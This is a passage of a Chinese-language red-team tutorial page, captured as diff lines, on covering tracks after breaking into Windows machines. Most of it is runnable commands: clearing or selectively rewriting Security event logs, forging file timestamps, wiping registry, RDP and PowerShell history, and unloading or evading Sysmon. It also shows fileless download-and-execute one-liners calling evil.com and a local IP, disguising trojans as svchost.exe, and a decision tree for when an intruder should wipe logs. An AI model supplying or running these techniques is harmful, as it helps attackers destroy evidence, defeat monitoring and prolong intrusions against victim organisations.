+<h3 id="方法一全部清空" class="toc-header"><a class="toc-anchor" href="#方法一全部清空">¶</a> 方法一：全部清空</h3>
+<pre class="prismjs line-numbers" v-pre="true"><code class="language-powershell"># PowerShell 清空
+wevtutil cl Security
+wevtutil cl System
+wevtutil cl Application
+
+# 或者用 PowerShell
+Clear-EventLog -LogName Security
+</code></pre>
+<p><strong>后果：</strong></p>
+<ul>
+<li>✅ 所有攻击痕迹全部删除</li>
+<li>❌ 留下 Event 1102（日志已清除）</li>
+</ul>
+<p><strong>何时使用：</strong></p>
+<ul>
+<li>对方已经发现这台机器</li>
+<li>需要防止他们提取你的工具特征</li>
+<li>你还有其他未暴露的据点</li>
+</ul>
+<hr>
+<h3 id="方法二定向删除" class="toc-header"><a class="toc-anchor" href="#方法二定向删除">¶</a> 方法二：定向删除</h3>
+<p><strong>原理：</strong> 只删除和你相关的事件，保留其他正常日志</p>
+<pre class="prismjs line-numbers" v-pre="true"><code class="language-powershell"># 删除指定 EventRecordID 的日志
+# 1. 导出时排除指定记录
+wevtutil epl Security tmp.evtx "/q:*[System [(EventRecordID!=1234)]]"
+
+# 2. 停止 EventLog 服务（需要高权限）
+Stop-Service EventLog
+
+# 3. 替换原日志文件
+Move-Item tmp.evtx %SystemRoot%\System32\Winevt\Logs\Security.evtx -Force
+
+# 4. 重启服务
+Start-Service EventLog
+</code></pre>
+<p><strong>优势：</strong></p>
+<ul>
+<li>✅ 不会触发 Event 1102</li>
+<li>✅ 日志看起来连续</li>
+</ul>
+<p><strong>劣势：</strong></p>
+<ul>
+<li>❌ 操作复杂，容易出错</li>
+<li>❌ 如果日志有时间断层，反而更可疑</li>
+</ul>
+<hr>
+<h3 id="方法三不清理但强调本身的隐蔽性" class="toc-header"><a class="toc-anchor" href="#方法三不清理但强调本身的隐蔽性">¶</a> 方法三：不清理，但强调本身的隐蔽性</h3>
+<p><strong>与其事后清理，不如事先做好隐蔽</strong></p>
+<pre class="prismjs line-numbers" v-pre="true"><code class="language-"># 无文件攻击，没有恶意文件落盘，当然这个例子肯定会被发现
+IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100/a')
+</code></pre>
+<p>无文件攻击的参考指南 <a href="https://lolbas-project.github.io/" class="is-external-link">https://lolbas-project.github.io/</a><br>
+<strong>无论如何都应该首先用隐蔽的方式展开红队行动</strong></p>
+<hr>
+<h2 id="h-5-其他关键痕迹清理" class="toc-header"><a class="toc-anchor" href="#h-5-其他关键痕迹清理">¶</a> 5. 其他关键痕迹清理</h2>
+<h3 id="清理文件痕迹" class="toc-header"><a class="toc-anchor" href="#清理文件痕迹">¶</a> ✅ 清理文件痕迹</h3>
+<pre class="prismjs line-numbers" v-pre="true"><code class="language-powershell"># 1. 删除木马文件（用复写增加恢复难度）
+cipher /w:C:\Temp
+
+# 2. 清空回收站
+Clear-RecycleBin -Force
+
+# 3. 清理临时目录
+Remove-Item C:\Windows\Temp\* -Recurse -Force
+Remove-Item $env:TEMP\* -Recurse -Force
+
+# 4. 清理下载记录
+Remove-Item "$env:USERPROFILE\Downloads\*" -Force
+</code></pre>
+<p><strong>进阶：时间戳伪造</strong></p>
+<pre class="prismjs line-numbers" v-pre="true"><code class="language-powershell"># 让文件看起来很"老"
+$file = Get-Item "payload.exe"
+$file.CreationTime = "2015-01-01 00:00:00"
+$file.LastWriteTime = "2015-01-01 00:00:00"
+</code></pre>
+<hr>
+<h3 id="清理注册表痕迹" class="toc-header"><a class="toc-anchor" href="#清理注册表痕迹">¶</a> ✅ 清理注册表痕迹</h3>
+<pre class="prismjs line-numbers" v-pre="true"><code class="language-powershell"># 清理程序运行记录
+Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Force
+
+# 清理最近打开记录
+Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" -Recurse -Force
+
+# 清理 RDP 连接记录
+Remove-Item "HKCU:\Software\Microsoft\Terminal Server Client\Default" -Force
+Remove-Item "HKCU:\Software\Microsoft\Terminal Server Client\Servers" -Recurse -Force
+</code></pre>
+<hr>
+<h3 id="清理-rdp-痕迹" class="toc-header"><a class="toc-anchor" href="#清理-rdp-痕迹">¶</a> ✅ 清理 RDP 痕迹</h3>
+<p>如果你用过 RDP 连接：</p>
+<pre class="prismjs line-numbers" v-pre="true"><code class="language-powershell"># 1. 删除 Default.rdp 文件
+cd %userprofile%\documents
+attrib Default.rdp -s -h
+del Default.rdp
+
+# 2. 清理注册表记录
+reg delete "HKCU\Software\Microsoft\Terminal Server Client\Default" /f
+reg delete "HKCU\Software\Microsoft\Terminal Server Client\Servers" /f
+</code></pre>
+<hr>
+<h3 id="清理网络痕迹" class="toc-header"><a class="toc-anchor" href="#清理网络痕迹">¶</a> ✅ 清理网络痕迹</h3>
+<pre class="prismjs line-numbers" v-pre="true"><code class="language-powershell"># 清除 DNS 缓存
+ipconfig /flushdns
+
+# 清除 ARP 缓存
+arp -d *
+
+# 清理 PowerShell 历史
+Remove-Item (Get-PSReadlineOption).HistorySavePath -Force
+</code></pre>
+<hr>
+<h2 id="h-6-对抗-sysmon" class="toc-header"><a class="toc-anchor" href="#h-6-对抗-sysmon">¶</a> 6. 对抗 Sysmon</h2>
+<h3 id="什么是-sysmon" class="toc-header"><a class="toc-anchor" href="#什么是-sysmon">¶</a> 什么是 Sysmon？</h3>
+<p>企业级增强审计工具，记录：</p>
+<ul>
+<li>进程创建（包括完整命令行）</li>
+<li>网络连接</li>
+<li>文件创建</li>
+</ul>
+<p><strong>问题：</strong> 即使你清理了 Windows 日志，Sysmon 还在记录。</p>
+<h3 id="检测-sysmon" class="toc-header"><a class="toc-anchor" href="#检测-sysmon">¶</a> 🔍 检测 Sysmon</h3>
+<pre class="prismjs line-numbers" v-pre="true"><code class="language-powershell"># 查看服务
+Get-Service | Where-Object {$_.Name -like "*sysmon*"}
+
+# 查看驱动
+fltmc | findstr Sysmon
+</code></pre>
+<h3 id="️-对抗策略" class="toc-header"><a class="toc-anchor" href="#️-对抗策略">¶</a> 🛡️ 对抗策略</h3>
+<h4 id="策略一卸载简单但明显" class="toc-header"><a class="toc-anchor" href="#策略一卸载简单但明显">¶</a> 策略一：卸载（简单但明显）</h4>
+<pre class="prismjs line-numbers" v-pre="true"><code class="language-cmd">sysmon -u
+</code></pre>
+<p><strong>问题：</strong> 卸载 Sysmon 本身就是重大安全事件。</p>
+<hr>
+<h4 id="策略二避开规则更聪明" class="toc-header"><a class="toc-anchor" href="#策略二避开规则更聪明">¶</a> 策略二：避开规则（更聪明）</h4>
+<p><strong>Sysmon 基于规则触发，我们可以用合法工具绕过：</strong></p>
+<pre class="prismjs line-numbers" v-pre="true"><code class="language-cmd">❌ 触发规则（PowerShell 下载执行）
+powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/a')"
+
+✅ 不触发规则（用 lolbins里的某个白名单文件执行）
+
+</code></pre>
+<p><strong>原理：</strong> 很多 Sysmon 规则只监控 <code>powershell.exe</code>，不监控一些冷门的微软程序。</p>
+<hr>
+<h2 id="h-7-无文件攻击最好的清理是不留痕迹" class="toc-header"><a class="toc-anchor" href="#h-7-无文件攻击最好的清理是不留痕迹">¶</a> 7. 无文件攻击：最好的清理是不留痕迹</h2>
+<h3 id="境界根本不产生痕迹" class="toc-header"><a class="toc-anchor" href="#境界根本不产生痕迹">¶</a> 🥇 境界：根本不产生痕迹</h3>
+<pre class="prismjs line-numbers" v-pre="true"><code class="language-powershell"># ❌ 传统方式（留下文件）
+certutil -urlcache -f http://evil.com/payload.exe payload.exe
+.\payload.exe
+
+# ✅ 无文件方式（不留痕迹） - 当然现在别用powershell了，会被轻松检测
+powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/a')"
+</code></pre>
+<p><strong>对比：</strong></p>
+<ul>
+<li>传统：磁盘留下 <code>payload.exe</code>，可以提取分析</li>
+<li>无文件：代码直接在内存执行，不落盘</li>
+</ul>
+<hr>
+<h3 id="伪装成系统进程" class="toc-header"><a class="toc-anchor" href="#伪装成系统进程">¶</a> 🎭 伪装成系统进程</h3>
+<pre class="prismjs line-numbers" v-pre="true"><code class="language-">❌ 木马名称：hacker_tool.exe
+✅ 木马名称：svchost.exe
+
+❌ 进程位置：C:\Users\victim\Desktop\
+✅ 进程位置：注入到 explorer.exe
+</code></pre>
+<p><strong>逻辑：</strong> 蓝队每天看到上千个 <code>svchost.exe</code>，但一个叫 <code>hacker_tool.exe</code> 的立刻就被发现。</p>
+<hr>
+<h2 id="h-8-清理的三个原则" class="toc-header"><a class="toc-anchor" href="#h-8-清理的三个原则">¶</a> 8. 清理的三个原则</h2>
+<h3 id="核心原则" class="toc-header"><a class="toc-anchor" href="#核心原则">¶</a> 🎯 核心原则</h3>
+<pre class="prismjs line-numbers" v-pre="true"><code class="language-">1️⃣ 最好的清理是不留痕迹
+   （无文件攻击 + 进程伪装 + 合法工具）
+
+2️⃣ 清不清日志取决于对手水平
+   （高手清，新手别清）
+
+3️⃣ 清理本身也是一种痕迹
+   （Event 1102 是把双刃剑）
+</code></pre>
+<hr>
+<h3 id="基本思路" class="toc-header"><a class="toc-anchor" href="#基本思路">¶</a> 💡 基本思路</h3>
+<blockquote>
+<p>清理痕迹不是单纯的"删除"，而是一种<strong>风险管理</strong>。</p>
+<p><strong>新手 vs 高手：</strong></p>
+<ul>
+<li>新手：看教程说"别清日志"，就永远不敢清</li>
+<li>老手：根据对手水平，选择最合适的策略</li>
+</ul>
+<p><strong>核心问题永远是：</strong><br>
+"我的对手是谁？他们会怎么发现我？"</p>
+</blockquote>
+<hr>
+<h3 id="真实案例对比" class="toc-header"><a class="toc-anchor" href="#真实案例对比">¶</a> 🎬 真实案例对比</h3>
+<p><strong>案例一：清空日志导致暴露</strong></p>
+<pre class="prismjs line-numbers" v-pre="true"><code class="language-">场景：入侵了不重要的文件服务器
+对手：普通运维，每周巡检
+操作：担心被发现，清空所有日志
+结果：运维看到 Event 1102，立即上报
+教训：原本可以潜伏几个月，3 天就暴露
+</code></pre>
+<p><strong>案例二：清空日志救了一命</strong></p>
+<pre class="prismjs line-numbers" v-pre="true"><code class="language-">场景：入侵了域控制器
+对手：专业安全团队，已经收到告警
+操作：迅速清空日志，删除文件
+结果：虽然这台暴露了，但没有提取到 IOC
+      安全团队无法横向追踪其他 20 台失陷主机
+教训：清空日志切断了证据链
+</code></pre>
+<hr>
+<h2 id="h-9-总结清理的决策树" class="toc-header"><a class="toc-anchor" href="#h-9-总结清理的决策树">¶</a> 9. 总结：清理的决策树</h2>
+<pre class="prismjs line-numbers" v-pre="true"><code class="language-">你入侵了一台服务器，现在考虑清理：
+
+第一步：评估对手
+├─ 专业安全团队？
+│  └─ 他们已经发现这台机器了吗？
+│     ├─ 是 → 清空日志（防止提取 IOC）
+│     └─ 否 → 不清理（保持隐蔽）
+│
+└─ 普通运维？
+   └─ 他们会定期巡检日志吗？
+      ├─ 是 → 千万别全清！（会暴露）
+      └─ 否 → 可以全清（反正他们不看）
+</code></pre>
+<hr>
+</div></template><template slot="comments"><div><comments></comments></div></template></page></div></body></html>
